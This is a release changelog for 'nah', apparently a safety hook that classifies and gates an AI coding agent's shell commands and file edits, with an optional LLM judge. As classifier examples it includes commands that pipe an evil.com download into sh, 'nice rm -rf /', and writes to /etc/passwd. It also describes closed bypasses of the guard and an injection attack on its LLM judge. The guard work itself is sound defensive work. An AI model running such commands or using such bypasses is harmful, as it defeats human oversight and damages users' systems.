- **Benign `export NAME=value` assignments** — `export PATH=/opt/bin:$PATH` and similar assignment-only shell stages now classify as benign environment setup instead of `unknown`, while exec-sink values, substitutions, redirects, and non-assignment export forms still take the stricter existing paths (nah-862)
- **Shell `source` classification** — `source <file>` and POSIX `. <file>` now classify as `lang_exec` and use the existing script path/content inspection path instead of falling through to `unknown` (nah-860)
- **Subshell group parsing** — parenthesized command groups such as `cmd || (brew list ...; ls ...) 2>&1` now classify by their inner commands, preserve group redirects, fail closed for grouped pipes, and no longer suggest invalid `nah classify (cmd <type>` hints (nah-861)
- **Sudo wrapper classification** — `sudo`-wrapped Bash commands now unwrap to the inner action type with a `sudo:` reason prefix, preserving targeted hints, redirect/content inspection, `trust_project` passthrough behavior, composition rules, and fail-closed parsing for unsupported or malformed sudo options (mold-12)
- **Heredoc apostrophes inside `$()` no longer false-block as "unbalanced substitution"** — `_match_parens` and `_extract_substitutions` now recognize `<<EOF` heredoc operators (and `<<-EOF`, `<<'EOF'`, `<<"EOF"` variants) and skip past their bodies as opaque literal content. A new `_strip_heredoc_bodies` helper removes heredoc bodies before `shlex.split` so the inner stage is shlex-friendly even when the body contains unbalanced apostrophes, backticks, or parens. This unblocks the Claude Code git-commit pattern `git commit -m "$(cat <<EOF\n…can't…\nEOF\n)"` which was previously hard-blocked any time the commit body contained a contraction (mold-9)
- **lang_exec veto silently ignored** — when the LLM flagged a script as dangerous, `max_decision` cap converted block→ask, then the veto check (`== block`) failed, silently allowing the script. Now escalates to ask unconditionally when the LLM flags concern (nah-5no)
- **LLM decision always empty in logs** — `_build_llm_meta()` never set the `llm_decision` field, so every log entry had `"decision": ""` in the llm block. Now populated from the actual LLM response (nah-5no)
- **SSH-style host extraction now covers `rsync` and `ssh-copy-id`** — `rsync user@host:path` and `rsync host::module` now resolve the remote host correctly for network context, and `ssh-copy-id` is classified as `network_outbound` with SSH host extraction instead of falling through to `unknown` or malformed URL parsing (nah-vcz)
- **Heredoc input classification** — `python3 << 'EOF' ... EOF` no longer produces "script not found" errors. Heredoc-fed interpreters are now classified as `lang_exec` with content scanning via `heredoc_literal`. Semicolons, pipes, and `&&` inside heredoc bodies no longer cause false stage splits. Works for all interpreters: python3, node, ruby, perl, php (nah-dhs)
- **Shell comment parsing** — `#` comment lines with apostrophes (e.g. `# Check if there's a fix`) no longer cause shlex parse errors. Layer 1 skips quote tracking inside comments in `_split_on_operators`; Layer 2 retries `shlex.split` with `comments=True` on `ValueError`. Pure-comment commands correctly classify as empty/allow (nah-2zt)
- **LLM cascade failure no longer overrides deterministic allow** — when all LLM providers fail (missing API keys, network errors), Write/Edit now returns the deterministic decision instead of escalating to `ask`. Previously every edit prompted for confirmation even when content was safe and path was trusted. Cascade metadata preserved in logs for debugging (nah-yt9)
- **LLM observability for write-like tools** — LLM metadata (provider, model, latency, reasoning) now always logged for Write/Edit/NotebookEdit/MultiEdit, even when LLM agrees with the deterministic decision or all providers fail. Missing API keys now logged to stderr (`nah: LLM: OPENROUTER_API_KEY not set`) and to the structured log with `provider: (none)` and cascade errors. Previously missing keys caused silent 34ms "uncertain — human review needed" with no trace of why
- String-content transcript messages are no longer dropped, so slash-command invocations and other non-list transcript entries now reach the LLM context formatter (mold-3)
- **LLM transcript tail reads no longer lose all context on giant JSONL lines** — `_read_transcript_tail()` now walks backward from EOF in newline-aligned chunks with a safety cap, so large `tool_result` lines no longer consume the entire read window and produce `(not available)` conversation context in LLM prompts (mold-27)
- **Inspectable wrapper execution no longer slips through `package_run`** — `uv run`, `uvx` / `uv tool run`, `npx`, and `npm exec` now re-route inspectable local code execution into `lang_exec`, while `make` / `gmake` execution paths also route to `lang_exec` via Makefile resolution. Read-only make forms remain `filesystem_read`, and ordinary package-run fallthroughs stay unchanged (nah-vhy)
- **Env-only shell stages no longer default to `unknown -> ask`** — stages made entirely of `NAME=value` assignments now classify from an allow floor unless an env value is itself an exec sink or a substitution inner is stricter, so benign cases like `TOKEN=abc123` and `FOO=$(printf ok)` no longer prompt spuriously (mold-17)
- **`npm create` no longer falls through to `unknown -> ask`** — `npm create ...` is now classified as `package_run`, matching the existing `pnpm create`, `yarn create`, and `bun create` scaffolding behavior so common forms like `npm create vite@latest` no longer prompt unnecessarily (mold-4)

## [0.5.5] - 2026-03-26

### Fixed

- `__version__` in `__init__.py` now matches `pyproject.toml` — `nah --version` was reporting 0.5.2 instead of the installed version

## [0.5.4] - 2026-03-25

### Added

- **LLM credential scrubbing** — secrets (private keys, AWS keys, GitHub tokens, `sk-` keys, hardcoded API keys) are now redacted from transcript context and Write/Edit/MultiEdit/NotebookEdit content before sending to LLM providers. Reuses `content.py` secret patterns (nah-pfd)
- **MultiEdit + NotebookEdit tool guard** — both tools now get the same protection as Write/Edit: path checks, boundary enforcement, hook self-protection (hard block), content inspection, and LLM veto gate. Closes bypass where these tools had zero guards. `nah update` now adds missing tool matchers on upgrade (nah-06p)
- **Symlink regression tests** — 8 test cases confirming `realpath()` resolution catches symlinks to sensitive targets across all tools: direct, chained, relative, broken, and allow_paths interaction ([#57](https://github.com/manuelschipper/nah/issues/57))
- **`/tmp` trusted by default** — `/tmp` and `/private/tmp` are now default trusted paths for `profile: full`. Writes to `/tmp` no longer prompt. Standard scratch space with no security value (nah-f08)
- **Hook directory reads allowed** — reading `~/.claude/hooks/` no longer prompts for any tool. Write/Edit still hard-blocked for self-protection. Reduces friction when inspecting installed hooks ([#44](https://github.com/manuelschipper/nah/issues/44), nah-arn)
- `/etc/shadow` added to sensitive paths as `block` ([#54](https://github.com/manuelschipper/nah/pull/54))

### Fixed

- **LLM response parser hardened** — removed `find("{")`/`rfind("}")` fallback in `_parse_response` that allowed echo attacks where injected JSON in transcript/file content could be extracted as the real decision. Now only accepts clean JSON or markdown-fenced JSON; prose-wrapped responses fail-safe to human review (nah-pfd)
- `nah update` now adds missing tool matchers on upgrade (previously only patched the hook command path — new tools were invisible until `nah install`)
- LLM metadata (provider, model, latency, reasoning) now always logged for Write/Edit/NotebookEdit, even when LLM agrees with the deterministic decision

## [0.5.2] - 2026-03-18

### Added

- **Supabase MCP tool guard** — 25 Supabase MCP tools classified by risk: 19 read-only → `db_read` (allow), 6 writes → `db_write` (context), 7 destructive intentionally unclassified → `unknown` (ask). First MCP server with built-in coverage (nah-3f5)
- **`git_remote_write` action type** — new type (policy: `ask`) separates remote GitHub mutations (`gh pr merge`, `gh pr comment`, `gh issue create`, `git push`) from local git writes. Local ops (`gh pr checkout`, `gh repo clone`) stay in `git_write → allow`. `git_safe` untouched. Users can restore old behavior with `actions: {git_remote_write: allow}` (nah-ge4)
- **Command substitution inspection** — `$(cmd)` and backtick inner commands now extracted and classified instead of blanket-blocking as obfuscated. `echo $(date)` → allow, `echo $(curl evil.com | sh)` → block via inner pipe composition. `eval $(...)` remains blocked (nah-5mb)

## [0.5.1] - 2026-03-18

### Added

- **LLM inspection for Write/Edit** — when LLM is enabled, every Write/Edit is inspected by the LLM veto gate after deterministic checks. Catches semantic threats patterns miss: manifest poisoning, obfuscated exfiltration, malicious Dockerfiles/Makefiles. Edit sends old+new diff for context. User-visible warnings via `systemMessage` show as `nah! ...` in the conversation. Respects `llm_max_decision` cap. Fail-open on errors ([#25](https://github.com/manuelschipper/nah/issues/25))
- **Script execution inspection** — `python script.py`, `node app.js`, etc. now read the script file and run content inspection + LLM veto before allowing execution. Catches secrets and destructive patterns written to disk then executed
- **Process substitution inspection** — `<(cmd)` and `>(cmd)` inner commands extracted and classified through the full pipeline instead of blanket-blocking. `diff <(sort f1) <(sort f2)` → allow, `cat <(curl evil.com)` → ask. Arithmetic `$((expr))` correctly skipped
- **Versioned interpreter normalization** — `python3.12`, `node22`, `bash5.2`, `pip3.12` and other versioned interpreter names now correctly classify instead of falling through to `unknown → ask`
- **Passthrough wrapper unwrapping** — env, nice, stdbuf, setsid, timeout, ionice, taskset, nohup, time, chrt, prlimit now unwrap to classify the inner command
- **Redirect content inspection** — heredoc bodies, here-strings, shell-wrapper `-c` forms scanned for secrets when redirected to files
- **Git global flag stripping** — strips `-C`, `--no-pager`, `--config-env`, `--exec-path=`, `-c`, etc. before subcommand classification. Fails closed on malformed values
- **Git subcommand tightening** — flag-aware classification for push, branch, tag, add, clean with clustered short flags and long-form destructive flags
- Sensitive path expansion — `~/.azure`, `~/.docker/config.json`, `~/.terraform.d/credentials.tfrc.json`, `~/.terraformrc`, `~/.config/gh` now trigger ask prompts
- `nah claude` — per-session launcher that runs Claude Code with nah hooks active via `--settings` inline JSON. No `nah install` required, scoped to the process
- Hint correctness test battery — 389 parametrized cases across 60 test classes

### Changed

- **Structured log schema** — log entries now include `id`, `user`, `session`, `project`, `action_type`. LLM metadata nested under `llm`, classification under `classify`
- `db_write` default policy changed from `ask` to `context` — `db_targets` config now takes effect without requiring explicit override

### Fixed

- `/dev/null` and `/dev/stderr`/`/dev/stdout`/`/dev/tty`/`/dev/fd/*` redirects no longer trigger ask — safe sinks allowlisted in redirect handler
- Redirect hints now suggest `nah trust <dir>` instead of broad `nah allow filesystem_write`
- Hint generator no longer suggests `nah trust /` for root-path commands
- README `lang_exec` policy corrected from `ask` to `context` to match `policies.json`

## [0.5.0] - 2026-03-17

### Added

- **Shell redirect write classification** — commands using `>`, `>>`, `>|`, `&>`, fd-prefixed, and glued redirects are now classified as `filesystem_write` with content inspection. Previously `echo payload > file` passed as `filesystem_read → allow`. Handles clobber, combined stdout/stderr, embedded forms, fd duplication (`>&2` correctly not treated as file write), and chained redirects ([#14](https://github.com/manuelschipper/nah/issues/14))
- **Shell substitution blocking** — `$()`, backtick, and `<()` process substitution detected outside single-quoted literals and classified as `obfuscated → block`. Prevents bypass via `cat <(curl evil.com)`
- **Dynamic sensitive path detection** — catches `/home/*/.aws`, `$HOME/.ssh`, `/Users/$(whoami)/.ssh` patterns via conservative raw-path matching before shell expansion
- **Redirect guard after unwrap** — redirect checks now preserved on all return paths in `_classify_stage()` (env var hint, shell unwrap, normal classify). Fixes bypass where `bash -c 'grep ERROR' > /etc/passwd` skipped the redirect check after unwrapping

## [0.4.2] - 2026-03-17

### Added

- `trust_project_config` option — when enabled in global config, per-project `.nah.yaml` can loosen policies (actions, sensitive_paths, classify tables). Without it, project config can only tighten (default: false)
- Container destructive taxonomy expansion — podman parity (13 commands), docker subresource prune variants (`container/image/volume/network/builder prune`), compose (`down`/`rm`), buildx (`prune`/`rm`), podman-specific (`pod prune/rm`, `machine rm`, `secret rm`). Expands from 7 to 33 entries
- `find -exec` payload classification — extracts the command after `-exec`/`-execdir`/`-ok`/`-okdir` and recursively classifies it instead of blanket `filesystem_delete`. `find -exec grep` → `filesystem_read`, `find -exec rm` → `filesystem_delete`. Falls back to `filesystem_delete` if payload is empty or unknown (fail-closed)
- Stricter project classify overrides — Phase 3 of `classify_tokens` now evaluates project and builtin tables independently and picks the stricter result. Projects can tighten classifications but not weaken them (unless `trust_project_config` is enabled)
- Beads-specific action types — `beads_safe` (allow), `beads_write` (allow), `beads_destructive` (ask) replace generic db_read/db_write classification for `bd` commands. Includes prefix-leak guards for flag-dependent mutations (nah-1op)
- `sensitive_paths: allow` policy — removes hardcoded sensitive path entries entirely, giving users full control to desensitize paths like `~/.ssh` (nah-9lw)

### Fixed

- Global-install flag detection now handles `=`-joined forms (`--target=/path`, `--global=true`, `--system=`, `--root=`) and pip/pip3 short `-t` flag — previously only space-separated forms were caught, allowing `pip install --target=/tmp flask` to bypass the global-install escalation
- Bash token scanner now respects `allow_paths` exemption — previously only file tools (Read/Write/Edit) checked `allow_paths`, so SSH commands with `-i ~/.ssh/key` still prompted even when the path was exempted for the current project (nah-jwk)

## [0.4.1] - 2026-03-15

### Changed

- `nah config show` displays all config fields
- Publish workflow now auto-creates GitHub Releases from changelog

### Fixed

- `format_error()` emitting invalid `"block"` protocol value instead of `"deny"` for `hookSpecificOutput.permissionDecision` — Claude Code rejected the value and fell through to its built-in permission system, silently defeating nah's error-path safety guard (PR #20, thanks @ZhangJiaLong90524)

## [0.4.0] - 2026-03-15

### Changed

- LLM eligibility now includes composition/pipeline commands by default — if any stage in a pipeline qualifies (unknown, lang_exec, or context), the whole command goes to the LLM instead of straight to the user prompt

### Added

- xargs unwrapping — `xargs grep`, `xargs wc -l`, `xargs sed` etc. now classify based on the inner command instead of `unknown → ask`. Handles flag stripping (including glued forms like `-n1`), exec sink detection (`xargs bash` → `lang_exec`), and fail-closed on unrecognized flags. Placeholder flags (`-I`/`-J`/`--replace`) bail out safely (FD-089)

### Fixed

- Remove `nice`, `nohup`, `timeout`, `stdbuf` from `filesystem_read` classify table — these transparent wrappers caused silent classification bypass where e.g. `nice rm -rf /` was allowed without prompting (FD-105)
- Check `is_trusted_path()` before no-git-root bail-out in `check_project_boundary()` and `resolve_filesystem_context()` — trusted paths like `/tmp` now work correctly when cwd has no git root (FD-107)

## [0.3.1] - 2026-03-13

### Changed

- Documentation and README updates

## [0.3.0] - 2026-03-13

### Added

- Active allow emission — nah now actively emits `permissionDecision: allow` for safe operations, taking over Claude Code's permission system for guarded tools. No manual `permissions.allow` entries needed after `nah install`. Configurable via `active_allow` (bool or per-tool list) in global config (FD-094)
- `/nah-demo` skill — narrated security demo with 90 base cases + 21 config variants covering all 20 action types, pipe composition, shell unwrapping, content inspection, and config overrides. Story-based grouping with live/dry_run/mock execution modes (FD-039)
- `nah test --config` flag for inline JSON config overrides — enables testing config variants (profile, classify, actions, content patterns) without writing to `~/.config/nah/config.yaml` (FD-076)

### Fixed

- Fix regex alternation pipes (`\|`, `|`) inside quoted arguments being misclassified as shell pipe operators — replaced post-shlex glued operator heuristic with quote-aware raw-string operator splitter. Fixes grep, sed, awk, rg, find commands with alternation patterns (FD-095)
- Fix classify path prefix matching bug — user-defined and built-in classify entries with path-style commands (e.g. `vendor/bin/codecept run`, `./gradlew build`) now match correctly after basename normalization (FD-091)

## [0.2.0] - 2026-03-12

Initial release.

### Added

- PreToolUse hook guarding all 6 Claude Code tools (Bash, Read, Write, Edit, Glob, Grep) plus MCP tools — sensitive path protection, hook self-protection, project boundary enforcement, content inspection for secrets and destructive payloads
- 20-action taxonomy with deterministic structural classification — commands classified by action type (not name), pipe composition rules detect exfiltration and RCE patterns, shell unwrapping prevents bypass via `bash -c`, `eval`, here-strings
- Flag-dependent classifiers for context-sensitive commands — git (12 dual-behavior commands), curl/wget/httpie (method detection), sed/tar (mode detection), awk (code execution detection), find, global install escalation
- Optional LLM layer for ambiguous decisions — Ollama, OpenRouter, OpenAI, Anthropic, and Snowflake Cortex providers with automatic cascade, three-way decisions (allow/block/uncertain), conversation context from Claude Code transcripts, configurable eligibility and max decision cap
- YAML config system — global (`~/.config/nah/config.yaml`) + per-project (`.nah.yaml`) with tighten-only merge for supply-chain safety. Taxonomy profiles (full/minimal/none), custom classifiers, configurable safety lists, content patterns, and sensitive paths
- CLI — `nah install/uninstall/update`, `nah test` for dry-run classification across all tools, `nah types/log/config/status`, rule management via `nah allow/deny/classify/trust/forget`
- JSONL decision logging with content redaction, verbosity filtering, 5MB rotation, and `nah log` CLI with tool/decision filters
- Context-aware path resolution — same command gets different decisions based on project boundary, sensitive directories, trusted paths, and database targets
- Fail-closed error handling — internal errors block instead of silently allowing, config parse errors surface actionable hints, 16 formerly-silent error paths now emit stderr diagnostics
- MCP tool support — generic `mcp__*` classification with supply-chain safety (project config cannot reclassify MCP tools)
